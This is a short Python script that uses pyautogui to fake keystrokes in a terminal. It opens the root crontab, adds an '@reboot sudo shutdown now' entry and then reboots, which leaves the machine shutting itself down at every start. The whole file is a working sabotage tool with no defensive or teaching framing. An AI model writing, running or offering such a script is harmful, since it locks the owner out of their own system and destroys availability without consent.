#import needed things

import time
import os
import pyautogui

from os import system
from time import sleep
from pyautogui import write
from pyautogui import press
from pyautogui import keyDown
from pyautogui import keyUp

#type @reboot sudo shutdown now in crontab

sleep(3)
write("sudo crontab -e")
press('enter')
keyDown('down')
sleep(2.4)
keyUp('down')
write("@reboot sudo shutdown now")
keyDown('ctrl')
keyDown('x')
sleep(0.1)
keyUp('ctrl')
keyUp('x')
press('y')
press('enter')
sleep(1)
write('reboot')
press('enter')
